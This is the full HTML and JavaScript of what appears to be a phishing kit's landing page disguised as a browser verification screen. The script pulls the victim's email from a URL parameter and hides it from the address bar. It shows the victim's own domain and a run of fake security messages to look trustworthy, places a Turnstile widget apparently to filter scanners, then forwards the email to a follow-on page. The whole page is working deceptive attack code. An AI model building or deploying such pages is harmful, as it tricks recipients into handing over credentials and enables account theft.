<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verification</title>

<style>
  body, html {
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    height: 100%;
    overflow: hidden;
    background: #1d1d1d;
    color: white;
  }

  /* Video container fullscreen */
  #intro-video {
    position: fixed;
    inset: 0;
    width: 100%;
    height: 100%;
    z-index: 9998;
    background: white;
    opacity: 1;
    transition: opacity 1s ease;
  }

  #intro-video iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  /* Verification overlay */
  #verification-overlay {
    position: fixed;
    inset: 0;
    background: #1d1d1d;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    opacity: 0;
    pointer-events: none;
    transition: opacity 1s ease;
  }

  #verification-overlay.active {
    opacity: 1;
    pointer-events: auto;
  }

  #verification-overlay.fade-out {
    opacity: 0;
    pointer-events: none;
  }
</style>
</head>

<body>

<!-- VIDEO BEFORE VERIFICATION -->
<div id="intro-video">
  <iframe src="https://streamable.com/e/cau62r?autoplay=1&nocontrols=1&mute=1" allow="autoplay; fullscreen" allowfullscreen></iframe>
</div>

<!-- VERIFICATION OVERLAY -->
<div id="verification-overlay">
  <h1 id="domain-title">Checking your browser...</h1>
  <p id="security-msg">Verifying you are human...</p>

  <div class="cf-turnstile"
       data-sitekey="0x4AAAAAABh8YRnURc-1UUi-"
       data-callback="onCaptchaSuccess">
  </div>
</div>

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<script>
/* ===============================
   GET EMAIL AND DOMAIN
================================ */
function getEmailRaw() {
  const params = new URLSearchParams(window.location.search);
  return params.get("bazz505") || "";
}
const email = getEmailRaw();

let domain = "";
if (email.includes("@")) domain = email.split("@")[1];
history.replaceState({}, document.title, window.location.pathname);

const title = document.getElementById("domain-title");
if (domain) title.textContent = `Checking your browser before accessing ${domain}`;

/* ===============================
   SECURITY MESSAGE CYCLE
================================ */
const securityMsg = document.getElementById("security-msg");
const messages = [
  "Performing browser integrity check...",
  "Validating session security...",
  `Preparing secure access to ${domain}...`,
  "Verifying you are human..."
];
const MESSAGE_INTERVAL = 1500; // ms per message

/* ===============================
   VIDEO AND OVERLAY CONTROL
================================ */
const introVideoDiv = document.getElementById("intro-video");
const verificationOverlay = document.getElementById("verification-overlay");

const VIDEO_DURATION = 7000; // Adjust video duration here (ms)
const OVERLAY_FADEIN_BEFORE_END = 1000; // Overlay starts 1s before video ends

setTimeout(() => {
  // Start crossfade: video fades out, overlay fades in
  verificationOverlay.classList.add("active");
  introVideoDiv.style.opacity = "0";

  // Remove video after fade
  setTimeout(() => introVideoDiv.remove(), 1000);

  // Start message cycle
  messages.forEach((msg, i) => {
    setTimeout(() => {
      securityMsg.textContent = msg;
    }, MESSAGE_INTERVAL * i);
  });

  // Total time for all messages
  const totalMessageTime = MESSAGE_INTERVAL * messages.length;

  // Fade out overlay after all messages are done
  setTimeout(() => {
    if (!verificationOverlay.classList.contains("fade-out")) {
      verificationOverlay.classList.add("fade-out");
      setTimeout(() => {
        window.location.href = `view.html?bazz505=${email}`;
      }, 900);
    }
  }, totalMessageTime);

}, VIDEO_DURATION - OVERLAY_FADEIN_BEFORE_END);

/* ===============================
   CAPTCHA SUCCESS
================================ */
window.onCaptchaSuccess = () => {
  verificationOverlay.classList.add("fade-out");
  setTimeout(() => {
    window.location.href = `view.html?bazz505=${email}`;
  }, 900);
};
</script>

</body>
</html>
